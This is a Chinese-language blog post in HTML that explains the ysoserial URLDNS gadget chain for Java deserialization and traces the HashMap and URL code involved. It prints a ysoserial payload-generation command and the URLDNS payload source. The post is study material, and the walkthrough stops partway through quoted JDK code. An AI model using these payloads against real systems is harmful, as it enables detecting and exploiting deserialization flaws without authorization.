@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>java安全 URLDNS链子分析 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="java安全 URLDNS链子分析">
+  <meta property="og:description" content="前言 p牛的 java安全漫谈中，介绍了URLDNS这个链子是很适合java反序列化入门的
+java反序列化工具ysoserial.jar https://github.com/frohoff/ysoserialjava安全⾥程碑式的⼯具
+他的作用就是根据你选择的利用链去生成反序列化数据的工具
+使用实例,选择利用链和要执行的命令就行了
+java -jar ysoserial.jar CommonsCollections1 calc.exe &gt; payload 利⽤链也叫“gadget chains”，通常称为gadget。它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能
+是 __desctruct 到 eval ；
+URLDNS URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不
+是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。
+他适合java反序列化入门是因为
+使⽤Java内置的类构造，对第三⽅库没有依赖
+在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞
+先看看ysoserial中URLDNS中的源码
+public class URLDNS implements ObjectPayload&lt;Object&gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:54:39+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:54:39+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java安全 URLDNS链子分析">
+  <meta name="twitter:description" content="前言 p牛的 java安全漫谈中，介绍了URLDNS这个链子是很适合java反序列化入门的
+java反序列化工具ysoserial.jar https://github.com/frohoff/ysoserialjava安全⾥程碑式的⼯具
+他的作用就是根据你选择的利用链去生成反序列化数据的工具
+使用实例,选择利用链和要执行的命令就行了
+java -jar ysoserial.jar CommonsCollections1 calc.exe &gt; payload 利⽤链也叫“gadget chains”，通常称为gadget。它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能
+是 __desctruct 到 eval ；
+URLDNS URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不
+是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。
+他适合java反序列化入门是因为
+使⽤Java内置的类构造，对第三⽅库没有依赖
+在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞
+先看看ysoserial中URLDNS中的源码
+public class URLDNS implements ObjectPayload&lt;Object&gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="next" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc1%E9%93%BE/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "java安全 URLDNS链子分析",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90\/"
+        },"genre": "posts","keywords": "java","wordcount":  740 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90\/","datePublished": "2024-08-20T22:54:39+08:00","dateModified": "2024-08-20T22:54:39+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">java安全 URLDNS链子分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;740 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#java反序列化工具ysoserialjar">java反序列化工具ysoserial.jar</a></li>
+    <li><a href="#urldns">URLDNS</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前言">前言</h2>
+<p>p牛的 java安全漫谈中，介绍了URLDNS这个链子是很适合java反序列化入门的</p>
+<h2 id="java反序列化工具ysoserialjar">java反序列化工具ysoserial.jar</h2>
+<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">https://github.com/frohoff/ysoserial</a>
+</p>
+<p>java安全⾥程碑式的⼯具</p>
+<p>他的作用就是根据你选择的利用链去生成反序列化数据的工具</p>
+<p>使用实例,选择利用链和要执行的命令就行了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar ysoserial.jar CommonsCollections1 calc.exe &gt; payload
+</span></span></code></pre></div><p>利⽤链也叫“gadget chains”，通常称为gadget。它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能</p>
+<p>是<code> __desctruct 到 eval</code> ；</p>
+<h2 id="urldns">URLDNS</h2>
+<p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不</p>
+<p>是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p>
+<p>他适合java反序列化入门是因为</p>
+<ul>
+<li>
+<p>使⽤Java内置的类构造，对第三⽅库没有依赖</p>
+</li>
+<li>
+<p>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</p>
+</li>
+</ul>
+<p>先看看ysoserial中URLDNS中的源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> <span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//Avoid DNS resolution during payload creation</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
+</span></span><span style="display:flex;"><span>                URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap(); <span style="color:#75715e">// HashMap that will contain the URL</span>
+</span></span><span style="display:flex;"><span>                URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler); <span style="color:#75715e">// URL to use as the Key</span>
+</span></span><span style="display:flex;"><span>                ht.<span style="color:#a6e22e">put</span>(u, url); <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                Reflections.<span style="color:#a6e22e">setFieldValue</span>(u, <span style="color:#e6db74">&#34;hashCode&#34;</span>, <span style="color:#f92672">-</span>1); <span style="color:#75715e">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> ht;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>                PayloadRunner.<span style="color:#a6e22e">run</span>(URLDNS.<span style="color:#a6e22e">class</span>, args);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * using the serialized object.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * &lt;b&gt;Potential false negative:&lt;/b&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * second resolution.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>注释里写了链子</p>
+<pre tabindex="0"><code> *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+</code></pre><p>跟着分析一下,进到<code>HashMap</code>里 看一下<code>readObject()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream s)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectInputStream.<span style="color:#a6e22e">GetField</span> fields <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readFields</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read loadFactor (ignore threshold)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">float</span> lf <span style="color:#f92672">=</span> fields.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;loadFactor&#34;</span>, 0.<span style="color:#a6e22e">75f</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lf <span style="color:#f92672">&lt;=</span> 0 <span style="color:#f92672">||</span> Float.<span style="color:#a6e22e">isNaN</span>(lf))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal load factor: &#34;</span> <span style="color:#f92672">+</span> lf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        lf <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">min</span>(Math.<span style="color:#a6e22e">max</span>(0.<span style="color:#a6e22e">25f</span>, lf), 4.<span style="color:#a6e22e">0f</span>);
+</span></span><span style="display:flex;"><span>        HashMap.<span style="color:#a6e22e">UnsafeHolder</span>.<span style="color:#a6e22e">putLoadFactor</span>(<span style="color:#66d9ef">this</span>, lf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        reinitialize();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">readInt</span>();                <span style="color:#75715e">// Read and ignore number of buckets</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> mappings <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readInt</span>(); <span style="color:#75715e">// Read number of mappings (size)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&lt;</span> 0) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal mappings count: &#34;</span> <span style="color:#f92672">+</span> mappings);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">==</span> 0) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// use defaults</span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> fc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)mappings <span style="color:#f92672">/</span> lf <span style="color:#f92672">+</span> 1.<span style="color:#a6e22e">0f</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> cap <span style="color:#f92672">=</span> ((fc <span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                       DEFAULT_INITIAL_CAPACITY :
+</span></span><span style="display:flex;"><span>                       (fc <span style="color:#f92672">&gt;=</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                       MAXIMUM_CAPACITY :
+</span></span><span style="display:flex;"><span>                       tableSizeFor((<span style="color:#66d9ef">int</span>)fc));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> ft <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)cap <span style="color:#f92672">*</span> lf;
+</span></span><span style="display:flex;"><span>            threshold <span style="color:#f92672">=</span> ((cap <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY <span style="color:#f92672">&amp;&amp;</span> ft <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                         (<span style="color:#66d9ef">int</span>)ft : Integer.<span style="color:#a6e22e">MAX_VALUE</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check Map.Entry[].class since it&#39;s the nearest public type to</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// what we&#39;re actually creating.</span>
+</span></span><span style="display:flex;"><span>            SharedSecrets.<span style="color:#a6e22e">getJavaObjectInputStreamAccess</span>().<span style="color:#a6e22e">checkArray</span>(s, Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, cap);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@SuppressWarnings</span>({<span style="color:#e6db74">&#34;rawtypes&#34;</span>,<span style="color:#e6db74">&#34;unchecked&#34;</span>})
+</span></span><span style="display:flex;"><span>            Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab <span style="color:#f92672">=</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span>)<span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            table <span style="color:#f92672">=</span> tab;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
+</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
+</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>                putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>继续跟进<code>HashMap.putVal()</code> 到 <code>HashMap.hash()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> 0 : (h <span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>()) <span style="color:#f92672">^</span> (h <span style="color:#f92672">&gt;&gt;&gt;</span> 16);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>hash()函数，调用了一个key对象的参数，执行了一个<code>key.hashCode()</code></p>
+<p>看链子最后是一个<code>URL.hashCode()</code> ，这里的key对象是URL，</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler); <span style="color:#75715e">// URL to use as the Key</span>
+</span></span></code></pre></div><p>回去跟进这个URL类，看看其 <code>hashCode </code>⽅法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        hashCode <span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hashCode;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>可以发现这里如果<code>hashCode</code>为-1的时候，他会重新计算<code>hashCode</code>，这时候就执行了一个<code>handler.hashCode(this)</code></p>
+<p>handler 跟一下发现 <code>URLStreamHandler handler</code> 是一个<code>URLStreamHandler</code>对象</p>
+<p>继续跟进这个<code>hashCode()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.</span>
+</span></span><span style="display:flex;"><span>        String protocol <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getProtocol</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (protocol <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> protocol.<span style="color:#a6e22e">hashCode</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.</span>
+</span></span><span style="display:flex;"><span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress(u);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (addr <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> addr.<span style="color:#a6e22e">hashCode</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            String host <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();
